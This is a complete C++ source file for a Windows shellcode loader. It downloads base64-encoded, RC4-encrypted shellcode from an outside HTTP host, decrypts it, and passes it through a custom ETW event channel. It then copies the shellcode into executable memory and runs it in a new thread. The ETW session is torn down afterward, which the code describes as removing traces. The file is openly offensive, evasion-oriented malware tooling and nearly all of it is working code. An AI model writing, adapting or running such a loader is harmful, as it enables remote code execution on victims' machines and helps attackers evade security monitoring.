#include <windows.h>
#include <winhttp.h>
#include <wincrypt.h>
#include <evntrace.h>   // ETW Tracing
#include <evntcons.h>   // ETW Consumers
#include <evntprov.h>   // ETW Providers
#include <iostream>
#include <string>
#include <vector>
#include <algorithm>

#pragma comment(lib, "Advapi32.lib")
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "crypt32.lib")

using namespace std;

const string RC4Key = "key"; // RC4 key

// Unique GUID for our custom ETW Provider (must be identical for sending & receiving)
static const GUID ProviderGuid = { 0xdeadc0de, 0x1337, 0x6969, { 0xab, 0xcd, 0xef, 0x01, 0x23, 0x45, 0x67, 0x89 } };

TRACEHANDLE hSession = 0; // ETW Session Handle
TRACEHANDLE hTrace = 0;   // ETW Trace Handle
REGHANDLE   hProvider = 0; // ETW Provider Handle

#ifndef PROCESS_TRACE_MODE_REAL_TIME
#define PROCESS_TRACE_MODE_REAL_TIME 0x00000100
#endif
#ifndef PROCESS_TRACE_MODE_EVENT_RECORD
#define PROCESS_TRACE_MODE_EVENT_RECORD 0x10000000
#endif

// Fetch a base64 string from an HTTP server using WinHTTP.
string FetchBase64Shellcode(const wchar_t* server, const wchar_t* resource) {
    string response;
    HINTERNET hSessionHTTP = WinHttpOpen(L"ETWShellcodeLoaderHTTP/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSessionHTTP) {
        cerr << "[!] WinHttpOpen failed. Error: " << GetLastError() << "\n";
        return "";
    }
    HINTERNET hConnect = WinHttpConnect(hSessionHTTP, server, 80, 0);
    if (!hConnect) {
        cerr << "[!] WinHttpConnect failed. Error: " << GetLastError() << "\n";
        WinHttpCloseHandle(hSessionHTTP);
        return "";
    }
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", resource, NULL,
        WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!hRequest) {
        cerr << "[!] WinHttpOpenRequest failed. Error: " << GetLastError() << "\n";
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSessionHTTP);
        return "";
    }
    BOOL bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
        WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
    if (!bResults) {
        cerr << "[!] WinHttpSendRequest failed. Error: " << GetLastError() << "\n";
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSessionHTTP);
        return "";
    }
    bResults = WinHttpReceiveResponse(hRequest, NULL);
    if (!bResults) {
        cerr << "[!] WinHttpReceiveResponse failed. Error: " << GetLastError() << "\n";
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSessionHTTP);
        return "";
    }
    DWORD dwSize = 0;
    do {
        DWORD dwDownloaded = 0;
        if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) {
            cerr << "[!] WinHttpQueryDataAvailable failed. Error: " << GetLastError() << "\n";
            break;
        }
        if (dwSize == 0)
            break;
        char* buffer = new char[dwSize + 1];
        ZeroMemory(buffer, dwSize + 1);
        if (!WinHttpReadData(hRequest, buffer, dwSize, &dwDownloaded)) {
            cerr << "[!] WinHttpReadData failed. Error: " << GetLastError() << "\n";
            delete[] buffer;
            break;
        }
        response.append(buffer, dwDownloaded);
        delete[] buffer;
    } while (dwSize > 0);
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSessionHTTP);
    return response;
}

// Decode a Base64 string into raw binary using CryptStringToBinaryA.
vector<unsigned char> DecodeBase64(const string& base64Data) {
    vector<unsigned char> decoded;
    DWORD cbBinary = 0;
    if (!CryptStringToBinaryA(base64Data.c_str(), 0, CRYPT_STRING_BASE64, NULL, &cbBinary, NULL, NULL)) {
        cerr << "[!] CryptStringToBinaryA (size query) failed. Error: " << GetLastError() << "\n";
        return decoded;
    }
    decoded.resize(cbBinary);
    if (!CryptStringToBinaryA(base64Data.c_str(), 0, CRYPT_STRING_BASE64, decoded.data(), &cbBinary, NULL, NULL)) {
        cerr << "[!] CryptStringToBinaryA (decode) failed. Error: " << GetLastError() << "\n";
        decoded.clear();
    }
    return decoded;
}

// Decrypts the data in the vector in place using RC4 with the given key.
void RC4DecryptInPlace(vector<unsigned char>& data, const string& key) {
    vector<unsigned char> S(256), K(256);
    for (int i = 0; i < 256; i++) {
        S[i] = (unsigned char)i;
        K[i] = (unsigned char)key[i % key.length()];
    }
    int j = 0;
    for (int i = 0; i < 256; i++) {
        j = (j + S[i] + K[i]) % 256;
        swap(S[i], S[j]);
    }
    int i = 0;
    j = 0;
    for (size_t n = 0; n < data.size(); n++) {
        i = (i + 1) % 256;
        j = (j + S[i]) % 256;
        swap(S[i], S[j]);
        int t = (S[i] + S[j]) % 256;
        unsigned char k = S[t];
        data[n] ^= k;
    }
}

// Stops the ETW session to remove traces.
void CleanupETWSession() {
    size_t bufferSize = sizeof(EVENT_TRACE_PROPERTIES) + sizeof(L"ETWShellcodeLoaderSession");
    EVENT_TRACE_PROPERTIES* pSessionProperties = (EVENT_TRACE_PROPERTIES*)calloc(1, bufferSize);
    if (!pSessionProperties) {
        cerr << "[!] Failed to allocate memory for ETW session properties.\n";
    }
    pSessionProperties->Wnode.BufferSize = (ULONG)bufferSize;
    pSessionProperties->Wnode.Flags = WNODE_FLAG_TRACED_GUID;
    pSessionProperties->Wnode.ClientContext = 1;
    pSessionProperties->Wnode.Guid = ProviderGuid;
    pSessionProperties->LogFileMode = EVENT_TRACE_REAL_TIME_MODE;
    pSessionProperties->MaximumFileSize = 0;
    pSessionProperties->LoggerNameOffset = sizeof(EVENT_TRACE_PROPERTIES);
    LPWSTR sessionName = (LPWSTR)((char*)pSessionProperties + pSessionProperties->LoggerNameOffset);
    wcscpy_s(sessionName, wcslen(L"ETWShellcodeLoaderSession") + 1, L"ETWShellcodeLoaderSession");

    ULONG status = QueryTrace(NULL, sessionName, pSessionProperties);
    if (status == ERROR_SUCCESS) {
        status = ControlTrace(hSession, sessionName, pSessionProperties, EVENT_TRACE_CONTROL_STOP);
        if (status == ERROR_SUCCESS) {
            cout << "[*] ETW session stopped & cleaned up.\n";
        }
        else {
            cerr << "[!] Failed to stop existing ETW session. Error: " << status << "\n";
            free(pSessionProperties);
        }
        Sleep(500);
    }
    else if (status == ERROR_WMI_INSTANCE_NOT_FOUND) {
        cout << "[+] No remaining ETW session found.\n";
    }
    else {
        cerr << "[!] QueryTrace failed. Error: " << status << "\n";
        free(pSessionProperties);
    }
}

// When an ETW event is received, extract and execute the shellcode.
void WINAPI EventCallback(PEVENT_RECORD pEvent) {
    if (!pEvent)
        return;
    cout << "[*] ETW event received!\n";
    if (memcmp(&pEvent->EventHeader.ProviderId, &ProviderGuid, sizeof(GUID)) == 0) {
        cout << "[+] Shellcode event detected. Extracting payload...\n";
        unsigned char* payload = (unsigned char*)pEvent->UserData;
        DWORD payloadSize = pEvent->UserDataLength;
        cout << "[*] Shellcode size: " << payloadSize << " bytes\n";
        LPVOID execMem = VirtualAlloc(NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!execMem) {
            cerr << "[!] VirtualAlloc failed. Error: " << GetLastError() << "\n";
            return;
        }
        memcpy(execMem, payload, payloadSize);
        cout << "[+] Shellcode copied to executable memory.\n";
        CleanupETWSession();
        cout << "[*] Executing shellcode...\n";
        HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)execMem, NULL, 0, NULL);
        if (hThread)
            CloseHandle(hThread);
    }
}

// Starts a new ETW session named "ETWShellcodeLoaderSession" and enables our provider.
bool StartETWSession() {
    size_t bufferSize = sizeof(EVENT_TRACE_PROPERTIES) + sizeof(L"ETWShellcodeLoaderSession");
    EVENT_TRACE_PROPERTIES* pSessionProperties = (EVENT_TRACE_PROPERTIES*)calloc(1, bufferSize);
    if (!pSessionProperties) {
        cerr << "[!] Failed to allocate memory for ETW session properties.\n";
        return false;
    }
    pSessionProperties->Wnode.BufferSize = (ULONG)bufferSize;
    pSessionProperties->Wnode.Flags = WNODE_FLAG_TRACED_GUID;
    pSessionProperties->Wnode.ClientContext = 1;
    pSessionProperties->Wnode.Guid = ProviderGuid;
    pSessionProperties->LogFileMode = EVENT_TRACE_REAL_TIME_MODE;
    pSessionProperties->MaximumFileSize = 0;
    pSessionProperties->LoggerNameOffset = sizeof(EVENT_TRACE_PROPERTIES);
    LPWSTR sessionName = (LPWSTR)((char*)pSessionProperties + pSessionProperties->LoggerNameOffset);
    wcscpy_s(sessionName, wcslen(L"ETWShellcodeLoaderSession") + 1, L"ETWShellcodeLoaderSession");

    ULONG status = QueryTrace(NULL, sessionName, pSessionProperties);
    if (status == ERROR_SUCCESS) {
        cout << "[*] Existing ETW session found. Stopping it...\n";
        status = ControlTrace(hSession, sessionName, pSessionProperties, EVENT_TRACE_CONTROL_STOP);
        if (status == ERROR_SUCCESS) {
            cout << "[+] Successfully stopped existing ETW session.\n";
        }
        else {
            cerr << "[!] Failed to stop existing ETW session. Error: " << status << "\n";
            free(pSessionProperties);
            return false;
        }
        Sleep(500);
    }
    else if (status == ERROR_WMI_INSTANCE_NOT_FOUND) {
        cout << "[+] No existing ETW session found. Proceeding.\n";
    }
    else {
        cerr << "[!] QueryTrace failed. Error: " << status << "\n";
        free(pSessionProperties);
        return false;
    }
    status = StartTrace(&hSession, sessionName, pSessionProperties);
    free(pSessionProperties);
    if (status != ERROR_SUCCESS) {
        cerr << "[!] StartTrace failed. Error: " << status << "\n";
        return false;
    }
    cout << "[+] ETW Session started successfully.\n";
    status = EnableTraceEx2(
        hSession,
        &ProviderGuid,
        EVENT_CONTROL_CODE_ENABLE_PROVIDER,
        TRACE_LEVEL_VERBOSE,
        0,
        0,
        0,
        NULL
    );
    if (status != ERROR_SUCCESS) {
        cerr << "[!] EnableTraceEx2 failed. Error: " << status << "\n";
    }
    else {
        cout << "[+] Provider enabled for the ETW session.\n";
    }
    return true;
}

// The listener thread that processes ETW events.
DWORD WINAPI ETWListenerThread(LPVOID lpParam) {
    EVENT_TRACE_LOGFILE logFile = { 0 };
    logFile.LoggerName = (LPWSTR)L"ETWShellcodeLoaderSession";
    logFile.ProcessTraceMode = PROCESS_TRACE_MODE_REAL_TIME | PROCESS_TRACE_MODE_EVENT_RECORD;
    logFile.EventRecordCallback = (PEVENT_RECORD_CALLBACK)EventCallback;
    hTrace = OpenTrace(&logFile);
    if (hTrace == INVALID_PROCESSTRACE_HANDLE) {
        cerr << "[!] OpenTrace failed. Error: " << GetLastError() << "\n";
        return 1;
    }
    cout << "[*] Listening for ETW shellcode events...\n";
    ULONG status = ProcessTrace(&hTrace, 1, NULL, NULL);
    if (status != ERROR_SUCCESS) {
        cerr << "[!] ProcessTrace failed. Error: " << GetLastError() << "\n";
        return 1;
    }
    CleanupETWSession();
    return 0;
}

// Registers our custom ETW provider.
void RegisterETWProvider() {
    ULONG status = EventRegister(&ProviderGuid, NULL, NULL, &hProvider);
    if (status != ERROR_SUCCESS) {
        cerr << "[!] Failed to register ETW provider. Error: " << status << "\n";
        exit(1);
    }
    cout << "[+] ETW provider registered.\n";
}

// SendShellcodeEvent: Sends the shellcode via an ETW event using an EVENT_DATA_DESCRIPTOR.
void SendShellcodeEvent(const unsigned char* shellcodeData, DWORD shellcodeSize) {
    if (!shellcodeData || shellcodeSize == 0) {
        cerr << "[!] No shellcode available to send.\n";
        return;
    }
    EVENT_DESCRIPTOR EventDesc = { 0 };
    EVENT_DATA_DESCRIPTOR dataDesc;
    EventDataDescCreate(&dataDesc, shellcodeData, shellcodeSize);
    cout << "[*] Sending shellcode via ETW event...\n";
    ULONG status = EventWrite(hProvider, &EventDesc, 1, &dataDesc);
    if (status != ERROR_SUCCESS) {
        cerr << "[!] EventWrite failed. Error: " << status << "\n";
    }
}

// UnregisterETWProvider: Unregisters our ETW provider.
void UnregisterETWProvider() {
    EventUnregister(hProvider);
    cout << "[*] ETW provider unregistered.\n";
}

int main() {
    // Fetch base64-encoded, RC4-encrypted shellcode from an HTTP server.
    wcout << L"[*] Fetching base64 shellcode from HTTP server...\n";
    // Replace with your actual server and resource.
    string base64Shellcode = FetchBase64Shellcode(L"shellcode-hosting.com", L"/shellcode.txt");
    if (base64Shellcode.empty()) {
        cerr << "[!] Failed to fetch base64 shellcode.\n";
        return 1;
    }
    cout << "[+] Base64 shellcode fetched (" << base64Shellcode.size() << " bytes).\n";

    // Decode the base64 shellcode.
    vector<unsigned char> decoded = DecodeBase64(base64Shellcode);
    if (decoded.empty()) {
        cerr << "[!] Failed to decode base64 shellcode.\n";
        return 1;
    }
    cout << "[+] Shellcode decoded successfully. Size: " << decoded.size() << " bytes.\n";

    // RC4-decrypt the decoded shellcode in-place using the pre-shared key.
    RC4DecryptInPlace(decoded, RC4Key);
    cout << "[+] Shellcode decrypted successfully. Final size: " << decoded.size() << " bytes.\n";

    // At this point, 'decoded' holds the final shellcode. We stream it directly into ETW.

    // Start the ETW session.
    if (!StartETWSession())
        return 1;

    // Register the ETW provider.
    RegisterETWProvider();

    // Start the ETW listener in a separate thread.
    HANDLE hListenerThread = CreateThread(NULL, 0, ETWListenerThread, NULL, 0, NULL);
    if (!hListenerThread) {
        cerr << "[!] Failed to create ETW listener thread. Error: " << GetLastError() << "\n";
        return 1;
    }
    Sleep(1000); // Ensure the listener thread is running.

    // Send the shellcode event via ETW, streaming directly from our decoded vector.
    SendShellcodeEvent(decoded.data(), (DWORD)decoded.size());

    // Unregister the ETW provider.
    UnregisterETWProvider();

    // Wait for the listener thread to finish processing.
    WaitForSingleObject(hListenerThread, INFINITE);

    // Keep the process running so that the shellcode thread can continue executing.
    Sleep(INFINITE);
    return 0;
}
